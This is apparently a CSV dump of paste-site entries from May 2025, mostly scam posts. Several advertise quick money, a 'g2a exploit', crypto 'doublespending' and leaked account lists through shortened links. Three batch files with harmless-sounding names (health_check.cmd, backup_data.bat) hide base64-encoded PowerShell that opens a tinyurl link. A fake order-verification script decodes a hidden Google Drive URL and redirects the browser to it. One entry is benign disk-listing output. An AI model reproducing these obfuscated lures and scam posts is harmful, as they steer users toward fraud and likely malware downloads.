id,title,username,language,date,content
RgFLXuHp,EARN $900 INSTANTLY 2025 EI,veta132007,JavaScript,Tuesday 6th of May 2025 07:05:08 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

mDufcfG9ZU
"
TBw5GMBF,health_check.cmd,SelfKey05,Batch,Tuesday 6th of May 2025 07:05:02 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYQAzADgANQBlAGIAMAAzAA==
EXIT /b
"
bsb3RqPb,Doublespending using Vanity Wallet,rodrigomaise99,JavaScript,Tuesday 6th of May 2025 07:01:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 17966
xz2iEDZY,Market.js,iLoveToWatch,JavaScript,Tuesday 6th of May 2025 07:01:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12283/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7kFNVKFZ,Crypto Accounts,Xp_Isolation,JavaScript,Tuesday 6th of May 2025 07:00:38 AM CDT,64634 Accounts Posted On https://t.me/leakzbyeminem
zyB8TyMw,Make $1000 15-MINUTES (BEGINNER) OV,veta132007,JavaScript,Tuesday 6th of May 2025 06:58:21 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

6pWjMbdhyW
"
VXZNTNL4,backup_data.bat,puppi28071,Batch,Tuesday 6th of May 2025 06:54:31 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AZgAyADEAMABhAGYAMwAyAA==
EXIT /b
"
nm7ZGtnW,"lsblk -o NAME,PARTLABEL,LABEL,UUID,MOUNTPOINT,FSTYPE output",SirFisho,Bash,Tuesday 6th of May 2025 06:54:02 AM CDT,"lsblk -o NAME,PARTLABEL,LABEL,UUID,MOUNTPOINT,FSTYPE
NAME PARTLABEL                    LABEL       UUID                                 MOUNTPOINT FSTYPE
loop0
                                                                                   /rofs      squash
loop1
                                                                                              squash
loop2
                                                                                              squash
loop3
                                                                                   /snap/core squash
loop4
                                                                                   /snap/core squash
loop5
                                                                                   /snap/bare squash
loop6
                                                                                   /snap/desk squash
loop7
                                                                                   /snap/firm squash
loop8
                                                                                   /snap/gnom squash
loop9
                                                                                   /snap/snap squash
loop10
                                                                                   /snap/snap squash
loop11
                                                                                   /snap/prom squash
loop12
                                                                                   /snap/snap squash
loop13
                                                                                   /snap/fire squash
loop14
                                                                                   /snap/gtk- squash
loop15
                                                                                   /snap/thun squash
loop16
                                                                                   /snap/ubun squash
sda                                                                                           
└─sda1
     Main Data Partition          UBUNTU 25_0 1CFE-0A60                            /cdrom     vfat
nvme1n1
│                                                                                             
├─nvme1n1p1
│    Microsoft reserved partition                                                             
└─nvme1n1p2
     Basic data partition         GAMES       74FAEB06FAEAC388                                ntfs
nvme0n1
│                                                                                             
├─nvme0n1p1
│    EFI system partition                     0835-D2B4                                       vfat
├─nvme0n1p2
│    Microsoft reserved partition                                                             
├─nvme0n1p3
│    Basic data partition                     A2443A94443A6AE5                                ntfs
└─nvme0n1p4
                                              A4C07B0CC07AE448                                ntfs
nvme2n1
│                                                                                             
├─nvme2n1p1
│                                             D209-DAD5                                       vfat
├─nvme2n1p2
│    recovery                                 D209-DA70                                       vfat
├─nvme2n1p3
│                                             e7c0a7e4-d81a-40a4-8467-a2e969c9d6a1            ext4
└─nvme2n1p4
                                              f7c2eec1-4eb2-404e-8404-efb0cb4f8d65            swap"
wRe5Ke49,schedule_tasks.ps1,puppi28071,Batch,Tuesday 6th of May 2025 06:54:00 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANAA2AGQAZAAzADYAZQBkAA==
EXIT /b
"
yQTGvmNu,EARN $900 INSTANTLY 2025⭐ DG,veta132007,JavaScript,Tuesday 6th of May 2025 06:51:37 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

sBEuNh2g5R
"
